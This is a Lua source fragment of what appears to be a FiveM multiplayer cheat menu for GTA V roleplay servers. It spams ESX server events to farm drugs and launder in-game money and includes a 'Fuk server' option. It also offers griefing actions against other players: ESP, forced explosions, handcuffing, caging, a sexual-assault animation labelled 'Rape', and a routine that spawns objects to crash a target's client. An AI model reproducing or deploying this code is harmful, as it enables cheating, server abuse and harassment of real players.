			elseif xnsadifnias.Button('Sell Meth ~c~(x5)') then
				TriggerServerEvent('esx_drugs:startSellMeth')
				TriggerServerEvent('esx_drugs:startSellMeth')
				TriggerServerEvent('esx_drugs:startSellMeth')
				TriggerServerEvent('esx_drugs:startSellMeth')
				TriggerServerEvent('esx_drugs:startSellMeth')
			elseif xnsadifnias.Button('Harvest Opium ~c~(x5)') then
				TriggerServerEvent('esx_drugs:startHarvestOpium')
				TriggerServerEvent('esx_drugs:startHarvestOpium')
				TriggerServerEvent('esx_drugs:startHarvestOpium')
				TriggerServerEvent('esx_drugs:startHarvestOpium')
				TriggerServerEvent('esx_drugs:startHarvestOpium')
			elseif xnsadifnias.Button('Transform Opium ~c~(x5)') then
				TriggerServerEvent('esx_drugs:startTransformOpium')
				TriggerServerEvent('esx_drugs:startTransformOpium')
				TriggerServerEvent('esx_drugs:startTransformOpium')
				TriggerServerEvent('esx_drugs:startTransformOpium')
				TriggerServerEvent('esx_drugs:startTransformOpium')
			elseif xnsadifnias.Button('Sell Opium ~c~(x5)') then
				TriggerServerEvent('esx_drugs:startSellOpium')
				TriggerServerEvent('esx_drugs:startSellOpium')
				TriggerServerEvent('esx_drugs:startSellOpium')
				TriggerServerEvent('esx_drugs:startSellOpium')
				TriggerServerEvent('esx_drugs:startSellOpium')
			elseif xnsadifnias.Button('Blanchiment ~c~(x10)') then
				TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
				TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
				TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
				TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
				TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
				TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
				TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
				TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
				TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
				TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
			elseif xnsadifnias.Button('Stop all ~c~(Drugs)') then
				TriggerServerEvent('esx_drugs:stopHarvestCoke')
				TriggerServerEvent('esx_drugs:stopTransformCoke')
				TriggerServerEvent('esx_drugs:stopSellCoke')
				TriggerServerEvent('esx_drugs:stopHarvestMeth')
				TriggerServerEvent('esx_drugs:stopTransformMeth')
				TriggerServerEvent('esx_drugs:stopSellMeth')
				TriggerServerEvent('esx_drugs:stopHarvestWeed')
				TriggerServerEvent('esx_drugs:stopTransformWeed')
				TriggerServerEvent('esx_drugs:stopSellWeed')
				TriggerServerEvent('esx_drugs:stopHarvestOpium')
				TriggerServerEvent('esx_drugs:stopTransformOpium')
				TriggerServerEvent('esx_drugs:stopSellOpium')
				drawNotification("Everything is now stopped.")
			end

			xnsadifnias.Display()
		elseif xnsadifnias.IsMenuOpened('TrollOptions') then 
			if xnsadifnias.Button('~g~~Fuk server | xaries v0.2~') then
				fukserver()
			elseif xnsadifnias.Button('Economy Die ESX') then
				TriggerServerEvent('esx_tabacjob:startSell')
			elseif xnsadifnias.Button('Tabac sell x5 ( ESX_Tabac )') then
				TriggerServerEvent('esx_tabacjob:startSell')
				TriggerServerEvent('esx_tabacjob:startSell')
				TriggerServerEvent('esx_tabacjob:startSell')
				TriggerServerEvent('esx_tabacjob:startSell')
				TriggerServerEvent('esx_tabacjob:startSell')
			end
					
			xnsadifnias.Display()
		elseif xnsadifnias.IsMenuOpened('PlayerMenu') then
			if xnsadifnias.CheckBox('ESP', esp, function(enabled)
					esp = enabled
				end) then
			elseif xnsadifnias.CheckBox('Player Blips Method 1', blips1, function(enabled)
					blips1 = enabled
				end) then
			elseif xnsadifnias.CheckBox('Player Blips Method 2', blips2, function(enabled)
					blips2 = enabled
					drawNotification("~r~Unckeck Method 2 to click on blips")
				end) then
			elseif xnsadifnias.CheckBox('ESP : INFO', info, function(enabled)
					info = enabled
				end) then
			elseif xnsadifnias.CheckBox('ESP : 3D BOX', box, function(enabled)
					box = enabled
				end) then
			elseif xnsadifnias.CheckBox('ESP : SNAPLINES', lines, function(enabled)
					lines = enabled
				end) then
			elseif xnsadifnias.MenuButton("Online Players", "OnlinePlayerMenu") then
			end

			xnsadifnias.Display()
		elseif xnsadifnias.IsMenuOpened("OnlinePlayerMenu") then
			for i = 0, 256 do
				if GetPlayerServerId(i) ~= 0 and xnsadifnias.MenuButton(GetPlayerName(i).." ~p~["..GetPlayerServerId(i).."]~s~ ~y~["..i.."]~s~ "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~[DEAD]" or "~g~[ALIVE]"), 'PlayerOptionsMenu') then
					SelectedPlayer = i
				end
			end

			xnsadifnias.Display()
		elseif xnsadifnias.IsMenuOpened("PlayerOptionsMenu") then
			xnsadifnias.SetSubTitle("PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayer).."]")
			if xnsadifnias.Button('Spectate', (Spectating and "~g~[SPECTATING]")) then
				SpectatePlayer(SelectedPlayer)
			elseif xnsadifnias.Button('Teleport To') then
				local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
				SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
			elseif xnsadifnias.Button('Explode') then
				AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, true, false, 100000.0)
			elseif xnsadifnias.Button('Give All Weapons') then
				for player=1, #allWeapons do
					GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
				end
			elseif xnsadifnias.MenuButton('Give Single Weapon', 'SingleWepPlayer') then
			elseif xnsadifnias.Button('Give Vehicle') then
				local ped = GetPlayerPed(SelectedPlayer)
				local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)

				if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
					RequestModel(ModelName)
					while not HasModelLoaded(ModelName) do
						Citizen.Wait(0)
					end

					local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
				else
					drawNotification("~r~Model is not valid!")
				end
			elseif xnsadifnias.Button("Handcuff Player ~r~(ESX_POLICEJOB)") then
				TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(SelectedPlayer))
			elseif xnsadifnias.Button("Kick From Vehicle") then
				ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
			elseif xnsadifnias.Button("Revive player ~r~( ESX_AMBULANCE )") then
				TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(SelectedPlayer))
			elseif xnsadifnias.Button('Kick Player (REQUIRES HOST)') then
				if NetworkIsHost() then
					NetworkSessionKickPlayer(SelectedPlayer)
				else
					drawNotification("~r~Not host of session!")
					end
                elseif xnsadifnias.Button('~h~~y~Explode ~s~Vehicle') then
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
                    else
                        av('~h~~b~Player not in a vehicle~s~.', false)
                    end
                elseif xnsadifnias.Button('~h~~r~Launch ~s~his car') then
                    if GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false) ~= 0 then
                        local e3 = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        local e4 = GetEntityHeading(GetPlayerPed(SelectedPlayer))
                        local e5 = CreatePed(5, 68070371, e3, e4, true)
                        local e6 = CreateVehicle(GetHashKey('adder'), e3, e4, true, false)
                        SetPedIntoVehicle(e5, e6, -1)
                    else
                        av('~h~~b~Player not in a vehicle~s~.', false)
                    end
                elseif xnsadifnias.Button('~h~~r~Banana ~p~Party') then
                    local bH = CreateObject(GetHashKey('p_crahsed_heli_s'), 0, 0, 0, true, true, true)
                    local bI = CreateObject(GetHashKey('prop_rock_4_big2'), 0, 0, 0, true, true, true)
                    local bJ = CreateObject(GetHashKey('prop_beachflag_le'), 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        bH,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                    AttachEntityToEntity(
                        bI,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                    AttachEntityToEntity(
                        bJ,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif xnsadifnias.Button('~h~~r~Explode') then
                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, 100000.0)
                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, true)
                elseif xnsadifnias.Button('~h~~r~Rape') then
                    RequestModelSync('a_m_o_acult_01')
                    RequestAnimDict('rcmpaparazzo_2')
                    while not HasAnimDictLoaded('rcmpaparazzo_2') do
                        Citizen.Wait(0)
                    end
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                        local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                        while not NetworkHasControlOfEntity(veh) do
                            NetworkRequestControlOfEntity(veh)
                            Citizen.Wait(0)
                        end
                        SetEntityAsMissionEntity(veh, true, true)
                        DeleteVehicle(veh)
                        DeleteEntity(veh)
                    end
                    count = -0.2
                    for b = 1, 3 do
                        local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
                        local bS = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
                        SetEntityAsMissionEntity(bS, true, true)
                        AttachEntityToEntity(
                            bS,
                            GetPlayerPed(SelectedPlayer),
                            4103,
                            11816,
                            count,
                            0.00,
                            0.0,
                            0.0,
                            0.0,
                            0.0,
                            false,
                            false,
                            false,
                            false,
                            2,
                            true
                        )
                        ClearPedTasks(GetPlayerPed(SelectedPlayer))
                        TaskPlayAnim(
                            GetPlayerPed(SelectedPlayer),
                            'rcmpaparazzo_2',
                            'shag_loop_poppy',
                            2.0,
                            2.5,
                            -1,
                            49,
                            0,
                            0,
                            0,
                            0
                        )
                        SetPedKeepTask(bS)
                        TaskPlayAnim(bS, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                        SetEntityInvincible(bS, true)
                        count = count - 0.4
                    end
                elseif xnsadifnias.Button('~h~~r~Cage ~s~Player') then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e7 = 'prop_fnclink_05crnr1'
                    local e8 = GetHashKey(e7)
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
                    local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
                    local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
                    SetEntityHeading(e9, -90.0)
                    SetEntityHeading(ea, 90.0)
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
                elseif xnsadifnias.Button('~h~~r~Hamburgher ~s~Player') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = GetHashKey(eb)
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        ed,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif xnsadifnias.Button('~h~~r~Hamburgher ~s~Player Car') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = GetHashKey(eb)
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        ed,
                        GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false),
                        GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 'chassis'),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif xnsadifnias.Button('~h~~r~Snowball troll ~s~Player') then
                    j = true
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local ee = 'sr_prop_spec_tube_xxs_01a'
                    local ef = GetHashKey(ee)
                    RequestModel(ef)
                    RequestModel(smashhash)
                    while not HasModelLoaded(ef) do
                        Citizen.Wait(0)
                    end
                    local eg = CreateObject(ef, roundx, roundy, roundz - 5.0, true, true, false)
                    SetEntityRotation(eg, 0.0, 90.0, 0.0)
                    local eh = -356333586
                    local bR = 'WEAPON_SNOWBALL'
                    for i = 0, 10 do
                        local bK = GetEntityCoords(eg)
                        RequestModel(eh)
                        Citizen.Wait(50)
                        if HasModelLoaded(eh) then
                            local ped =
                                CreatePed(
                                21,
                                eh,
                                bK.x + math.sin(i * 2.0),
                                bK.y - math.sin(i * 2.0),
                                bK.z - 5.0,
                                0,
                                true,
                                true
                            ) and
                                CreatePed(
                                    21,
                                    eh,
                                    bK.x - math.sin(i * 2.0),
                                    bK.y + math.sin(i * 2.0),
                                    bK.z - 5.0,
                                    0,
                                    true,
                                    true
                                )
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetCurrentPedWeapon(ped, GetHashKey(bR), true)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif xnsadifnias.Button('~h~~o~_!_ ~r~CRASH ~s~Player ~o~_!_') then
                    local ej = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local ek = {
                        0x9CF21E0F,
                        0x34315488,
                        0x6A27FEB1,
                        0xCB2ACC8,
                        0xC6899CDE,
                        0xD14B5BA3,
                        0xD9F4474C,
                        0x32A9996C,
                        0x69D4F974,
                        0xCAFC1EC3,
                        0x79B41171,
                        0x1075651,
                        0xC07792D4,
                        0x781E451D,
                        0x762657C6,
                        0xC2E75A21,
                        0xC3C00861,
                        0x81FB3FF0,
                        0x45EF7804,
                        0xE65EC0E4,
                        0xE764D794,
                        0xFBF7D21F,
                        0xE1AEB708,
                        0xA5E3D471,
                        0xD971BBAE,
                        0xCF7A9A9D,
                        0xC2CC99D8,
                        0x8FB233A4,
                        0x24E08E1F,
                        0x337B2B54,
                        0xB9402F87,
                        0x4F2526DA
                    }
                    for i = 1, #ek do
                        local a = CreateObject(ek[i], ej, true, true, true)
                    end
                end
			xnsadifnias.Display()
			
		elseif xnsadifnias.IsMenuOpened("SingleWepPlayer") then
			for player=1, #allWeapons do
				if xnsadifnias.Button(allWeapons[player]) then
					GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[player]), 1000, false, true)
				end
			end
			


			xnsadifnias.Display()
		elseif IsDisabledControlPressed(0, 315) then
			xnsadifnias.OpenMenu('MainMenu')
		end

		Citizen.Wait(0)
	end
end)



RegisterCommand("killmenu", function(source,args,raw)
	Enabled = false
end, false)